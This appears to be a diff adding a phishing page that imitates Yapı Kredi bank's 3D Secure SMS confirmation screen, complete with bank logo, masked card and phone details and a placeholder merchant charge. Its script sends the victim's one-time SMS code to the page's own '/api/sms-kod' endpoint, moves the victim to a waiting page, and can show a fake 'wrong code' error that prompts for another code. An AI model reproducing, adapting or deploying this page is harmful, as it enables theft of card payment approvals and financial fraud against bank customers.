@@ -1,0 +1,263 @@
+﻿<html data-ng-app="threeDSecureApp" lang="tr" class="ng-scope">
+
+<head>
+  <style type="text/css">
+    @charset "UTF-8";
+
+    [ng\:cloak],
+    [ng-cloak],
+    [data-ng-cloak],
+    [x-ng-cloak],
+    .ng-cloak,
+    .x-ng-cloak,
+    .ng-hide:not(.ng-hide-animate) {
+      display: none !important;
+    }
+
+    ng\:form {
+      display: block;
+    }
+
+    .ng-animate-shim {
+      visibility: hidden;
+    }
+
+    .ng-anchor {
+      position: absolute;
+    }
+  </style>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Yapı Kredi</title>
+  <base href="/TDSecureTroy/">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" type="text/css" href="/yapi/css/timecircles.css?_=1788566308173">
+  <link rel="stylesheet" type="text/css" href="/yapi/css/tds.css?_=1788566308173">
+  <link rel="stylesheet" type="text/css" href="/yapi/css/ngDialog.css?_=1788566308173">
+  <link rel="stylesheet" type="text/css" href="/yapi/css/ngDialog-custom-width.css?_=1788566308173">
+  <link rel="stylesheet" type="text/css" href="/yapi/css/ngDialog-theme-default.css?_=1788566308173">
+  <link rel="stylesheet" type="text/css" href="/yapi/css/ngDialog-theme-plain.css?_=1788566308173">
+  <link rel="stylesheet" href="/yapi/css/bootstrap.min.css?_=1788566308173">
+  <link rel="stylesheet" href="/yapi/css/bootstrap-theme.min.css?_=1788566308173">
+  <link rel="stylesheet" href="/yapi/css/main.css?_=1788566308173">
+
+</head>
+
+<body class="">
+  <%
+    var kartMarka = String((kullanici && (kullanici.kartMarka || kullanici.marka)) || '').toUpperCase();
+    var kartLogo = '/img/master.png';
+    if (kartMarka.indexOf('VISA') !== -1) {
+      kartLogo = '/img/visa.png';
+    } else if (kartMarka.indexOf('TROY') !== -1) {
+      kartLogo = '/img/troy.png';
+    } else if (kartMarka.indexOf('DISCOVER') !== -1) {
+      kartLogo = '/img/Discover.png';
+    }
+
+    var islemAdiGoster = (typeof islemAdi !== 'undefined' && islemAdi) ? String(islemAdi) : 'HOSTINGDUNYAM';
+    var tutarGoster = (typeof tutar !== 'undefined' && tutar) ? String(tutar) : '1,00 TL';
+    var simdi = new Date();
+    var tarihMetni = simdi.toLocaleString('tr-TR', {
+      day: '2-digit',
+      month: '2-digit',
+      year: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit'
+    });
+
+    var kartNoRaw = String((kullanici && kullanici.kartNo) || '').replace(/\D/g, '');
+    var kartNoGoster = '****';
+    if (kartNoRaw.length >= 4) {
+      kartNoGoster = kartNoRaw.slice(0, 4) + ' ' + kartNoRaw.slice(4, 6) + '** **** ' + kartNoRaw.slice(-4);
+    } else if (typeof kartNoSon4 !== 'undefined' && kartNoSon4) {
+      kartNoGoster = '**** **** **** ' + String(kartNoSon4);
+    }
+
+    var telefonRaw = String((kullanici && kullanici.telefon) || '').replace(/\D/g, '');
+    var telefonGoster = '0 5XX *** XX XX';
+    if (telefonRaw.length >= 10) {
+      telefonGoster = '0 ' + telefonRaw.slice(1, 4) + ' *** ' + telefonRaw.slice(-4, -2) + ' ' + telefonRaw.slice(-2);
+    }
+  %>
+  <div>
+    <div data-ng-view="" class="ng-scope">
+
+      <div class="wrapper ng-scope" style="padding-top: 50px; padding-bottom: 0;">
+        <div class="container">
+          <div class="card standart-mea" style="margin: auto;">
+            <div class="card-header">
+              <h3 class="card-heading pull-left ng-binding" style="font-size: 14px;">Üç Boyutlu Güvenlik Sistemi</h3>
+              <div class="header-menu pull-right">
+                <a class="help" data-ng-click="openHelpPage()">
+                  <span class="icon">?</span>
+                  <span style="font-size:12px;" class="ng-binding">Yardım</span>
+                </a>
+                <a class="help" data-ng-click="changeCurrentLang()">
+                  <span class="icon ng-binding">EN</span>
+                  <span style="font-size:12px;" class="ng-binding">English</span>
+                </a>
+              </div>
+            </div>
+            <div class="card-content standart-mea" style="padding: 10px;">
+              <div data-ng-include="'partials/helpHeader.jsp'" class="ng-scope">
+                <div class="row head-row ng-scope" style="padding-top: 0px; padding-bottom: 10px;">
+                  <div class="col-xs-12">
+                    <img src="/yapi/img/ykblogo.svg" alt="Yapı Kredi" style="width: 120px; height: 47px;">
+                    <img class="pull-right" alt="Kart Markası" ng-attr-style="{{dynamicClass}}"
+                      ng-src="<%= kartLogo %>" src="<%= kartLogo %>"
+                      style="width: 76px; margin-top: 3px;">
+                  </div>
+                </div>
+              </div>
+
+              <div class="customer-info ng-scope" style="font-size: 12px;"
+                ng-if="(!post && ecom && !waiting && !limitInc && !consent) || (!post && ecom && !waiting && limitInc && isLimitIncCompleted && !consent) ">
+                <div class="row">
+                  <div class="col-xs-5 ng-binding">Üye İşyeri İsmi</div>
+                  <div class="col-xs-7 customer-val"><strong class="ng-binding"><%= islemAdiGoster %></strong></div>
+                </div>
+                <div class="row">
+                  <div class="col-xs-5 ng-binding">Tutar</div>
+                  <div class="col-xs-7 customer-val"><strong class="ng-binding"><%= tutarGoster %></strong></div>
+                </div>
+                <div class="row">
+                  <div class="col-xs-5 ng-binding">Tarih</div>
+                  <div class="col-xs-7 customer-val"><strong class="ng-binding"><%= tarihMetni %></strong></div>
+                </div>
+                <div class="row">
+                  <div class="col-xs-5 ng-binding">Kart Numarası</div>
+                  <div class="col-xs-7"><strong class="ng-binding"><%= kartNoGoster %></strong></div>
+                </div>
+                <div class="row ng-scope" ng-if="gsm != null && currentApprovalType === 'AS'">
+                  <div class="col-xs-5 ng-binding">Cep Telefonu</div>
+                  <div class="col-xs-7 customer-val"><strong class="ng-binding"><%= telefonGoster %></strong></div>
+                </div>
+                <p class="disclaimer"><span class="warning-icon ng-binding">Bu bilgiler işyerleri ile
+                    paylaşılmamaktadır.</span></p>
+              </div>
+
+              <form class="form-horizontal container ng-pristine ng-valid ng-scope"
+                style="width: inherit; font-size: 12px; padding-top: 10px;" ng-init="startCountdown()"
+                ng-if="!post && currentApprovalType === 'AS'">
+                <div class="form-content row ng-scope" ng-if="!waiting" style="margin: 0px;">
+                  <div class="ng-scope" ng-if="!showUserList" style="margin-bottom: 0px; font-size: 13px;">
+                    <div class="col-sm-4 col-xs-6" style="font-size:12px; padding-right: 0px; padding-left: 0px;">
+                      <label for="smspass" class="smsinfo control-label ng-binding"
+                        style="padding-left: 0px; padding-right: 0px; margin-top: 5px;">Akıllı SMS Şifresi</label>
+                    </div>
+                    <div ng-class="inputClass" style="margin-bottom: 5px;" class="smsinfo col-sm-8 col-xs-6">
+                      <div class="info-input">
+                        <input type="text" inputmode="numeric" class="form-control ng-pristine ng-untouched ng-valid" style=""
+                          ng-class="{tdserrorinput: error || missing}" id="smspass" ng-model="$root.smspass"
+                          maxlength="5" autocomplete="one-time-code" placeholder="SMS Kodu"
+                          onkeypress="return ((event.charCode >= 48 && event.charCode <= 57 && value.length < 5) || event.charCode == 13 || event.charCode == 0)">
+                      </div>
+                    </div>
+                    <div id="hataliBildirim" style="display:none; color:#b91c1c; font-size:12px; margin-top:5px; font-weight:700; background:#fff1f2; border:1px solid #fecdd3; padding:8px 10px; border-radius:4px; text-align:center;"></div>
+                  </div>
+                </div>
+                <div class="form-content row" style="margin: 0px; padding-top: 0px;">
+                  <div ng-if="!showUserList" class="ng-scope">
+                    <div class="col-sm-12 col-xs-12" style="padding-left: 0px; padding-right: 0px;">
+                      <div class="row">
+                        <div class="smsinfo col-sm-12 col-xs-12">
+                          <p class="ng-binding">Cep telefonu numaranızı değiştirmek için <a
+                              data-ng-click="getUserPhoneList()" class="ng-binding">tıklayınız.</a></p>
+                        </div>
+                      </div>
+                      <div class="row ng-scope" ng-if="seal && currentApprovalType === 'AS'"
+                        style="padding-top: 5px;">
+                        <div class="col-sm-12 col-xs-12">
+                          <p class="ng-binding">Akıllı Bildirim ile doğrulamak için <a
+                              data-ng-click="changeApprovalType('SEAL');" class="ng-binding">tıklayınız.</a></p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="form-footer" style="background-color: #f1f8fe; padding-bottom: 10px;">
+                    <div class="" style="margin-bottom: 0px; margin: auto;">
+                      <div id="common" class="col-sm-12 col-xs-12 ng-scope" style="margin-top: 10px;"
+                        ng-if="!ecom || (!consent && !(ecom && !waiting && limitInc && !isLimitIncCompleted && !showUserList))">
+                        <button id="btnCommit" class="submit-btn pull-right ng-binding" style="margin: auto; /*width: 100%;*/"
+                          type="submit" data-ng-click="submit()">Onay</button>
+                        <button class="cancel-btn pull-right ng-binding"
+                          style="padding-right: 10px; padding-left: 10px;" type="button"
+                          data-ng-click="reject()">Vazgeç</button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </form>
+              <div class="container" style="width: inherit">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      var form = document.querySelector('form.form-horizontal');
+      var input = document.getElementById('smspass');
+      var btn = document.getElementById('btnCommit');
+      var errorBox = document.getElementById('hataliBildirim');
+      if (!form || !input || !btn) return;
+
+      function setError(msg) {
+        if (!errorBox) return;
+        errorBox.textContent = msg || 'Hatalı SMS girdiniz. Lütfen tekrar deneyin.';
+        errorBox.style.display = msg ? 'block' : 'none';
+      }
+
+      var params = new URLSearchParams(window.location.search);
+      if (params.get('hatali') === '1' && errorBox) {
+        errorBox.textContent = 'Hatalı SMS girdiniz. Lütfen tekrar deneyin.';
+        errorBox.style.display = 'block';
+      }
+
+      input.addEventListener('input', function () {
+        input.value = input.value.replace(/\D/g, '').slice(0, 5);
+        if (errorBox) errorBox.style.display = 'none';
+      });
+
+      form.addEventListener('submit', function (event) {
+        event.preventDefault();
+        var kod = input.value.trim();
+        if (!/^\d{5}$/.test(kod)) {
+          setError('Lütfen 5 haneli SMS kodunu giriniz.');
+          return;
+        }
+
+        btn.disabled = true;
+        setError('');
+
+        fetch('/api/sms-kod', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ kod: kod })
+        })
+          .then(function (response) {
+            return response.json();
+          })
+          .then(function (data) {
+            if (!(data && data.ok)) {
+              btn.disabled = false;
+              setError((data && data.hata) || 'SMS kodu kaydedilemedi.');
+              return;
+            }
+            window.location.href = '/bekleme';
+          })
+          .catch(function () {
+            btn.disabled = false;
+            setError('Sunucuya bağlanılamadı. Lütfen tekrar deneyin.');
+          });
+      });
+    })();
+  </script>
+</body>
+
+</html>
